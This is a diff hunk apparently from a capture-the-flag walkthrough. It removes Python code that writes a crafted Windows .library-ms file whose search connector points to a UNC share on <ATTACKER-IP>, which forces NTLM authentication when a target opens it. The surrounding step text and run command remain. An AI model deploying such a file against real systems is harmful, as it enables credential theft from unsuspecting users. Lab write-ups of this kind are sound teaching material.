@@ -91,32 +91,6 @@ Step 1: Create Malicious .library-ms File
 
 A crafted .library-ms file is created to trigger authentication when opened on the target.
 
-``` python3
-malicious_library = """<?xml version="1.0" encoding="UTF-8"?>
-<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
-  <name>Fluffy Documents</name>
-  <version>6</version>
-  <isLibraryPinned>true</isLibraryPinned>
-  <iconReference>%SystemRoot%\\system32\\imageres.dll,-100</iconReference>
-  <templateInfo>
-    <folderType>Documents</folderType>
-  </templateInfo>
-  <searchConnectorDescriptionList>
-    <searchConnectorDescription>
-      <isDefaultSaveLocation>true</isDefaultSaveLocation>
-      <simpleLocation>
-        <url>\\\\<ATTACKER-IP>\\share</url>
-      </simpleLocation>
-    </searchConnectorDescription>
-  </searchConnectorDescriptionList>
-</libraryDescription>
-"""
-
-with open("fluffy_attack.library-ms", "w") as f:
-    f.write(malicious_library)
-print("Malicious .library-ms file created.")
-```
-
 ```bash
 python3 generate_library.py
 ```
